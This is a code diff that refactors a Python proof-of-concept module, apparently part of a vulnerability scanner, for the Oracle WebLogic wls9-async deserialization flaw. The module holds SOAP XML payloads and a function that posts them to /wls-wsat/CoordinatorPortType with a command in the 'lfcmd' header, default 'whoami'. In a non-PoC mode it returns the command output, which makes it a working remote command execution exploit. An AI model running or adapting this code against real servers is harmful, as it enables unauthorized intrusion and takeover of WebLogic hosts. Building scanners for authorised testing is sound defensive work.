@@ -1,8 +1,8 @@
 # -*- coding:utf-8 -*-
 # weblogic_wls9-async反序列化
 
-from .. import requestUtil
 from ServiceScanModel.models import ServiceScan
+from ..requestClass import Requests
 
 xml_payload_10 = """
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
@@ -67,42 +67,45 @@ xml_payload_12 = """
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 """
 
+class POC:
+    def __init__(self, service: ServiceScan):
+        self.service = service
+        self.requestUtil = Requests(service.cookies)
+        self.result = False
 
-def wls9_cmd(url, cmd="whoami", type="poc", mode=10):
-    resp = requestUtil.post(url + "/wls-wsat/CoordinatorPortType", header={
-        "lfcmd": cmd,
-        "Content-Type": "text/xml"
-    }, data=xml_payload_10 if int(mode) == 10 else xml_payload_12)
-    if type == "poc":
-        if len(resp.text) > 0 and len(resp.text) < 50 and resp.status_code == 200:
-            return (resp.text, 10)
-        else:
-            resp = requestUtil.post(url + "/wls-wsat/CoordinatorPortType", header={
-                "lfcmd": cmd,
-                "Content-Type": "text/xml"
-            }, data=xml_payload_12)
+    def wls9_cmd(self, url, cmd="whoami", type="poc", mode=10):
+        resp = self.requestUtil.post(url + "/wls-wsat/CoordinatorPortType", header={
+            "lfcmd": cmd,
+            "Content-Type": "text/xml"
+        }, data=xml_payload_10 if int(mode) == 10 else xml_payload_12)
+        if type == "poc":
             if len(resp.text) > 0 and len(resp.text) < 50 and resp.status_code == 200:
-                return (resp.text[:100], 12)
+                return (resp.text, 10)
+            else:
+                resp = self.requestUtil.post(url + "/wls-wsat/CoordinatorPortType", header={
+                    "lfcmd": cmd,
+                    "Content-Type": "text/xml"
+                }, data=xml_payload_12)
+                if len(resp.text) > 0 and len(resp.text) < 50 and resp.status_code == 200:
+                    return (resp.text[:100], 12)
+                return False
+        else:
+            return resp.text
+
+    def fingerprint(self):
+        try:
+            if self.service.url:
+                resp = self.requestUtil.get(self.service.url + "/_async/AsyncResponseService")
+                if resp.status_code == 200:
+                    return True
+        except:
             return False
-    else:
-        return resp.text
 
-
-def fingerprint(service):
-    try:
-        if service.url:
-            resp = requestUtil.get(service.url + "/_async/AsyncResponseService")
-            if resp.status_code == 200:
-                return True
-    except:
-        return False
-
-
-def poc(service: ServiceScan):
-    try:
-        result = wls9_cmd(service.url)
-        print(result)
-        if result:
-            return (["weblogic_wls9-async反序列化", "当前用户: %s" % result[0]], result[1])
-    except:
-        return []
+    def poc(self):
+        try:
+            result = self.wls9_cmd(self.service.url)
+            print(result)
+            if result:
+                return (["weblogic_wls9-async反序列化", "当前用户: %s" % result[0]], result[1])
+        except:
+            return []
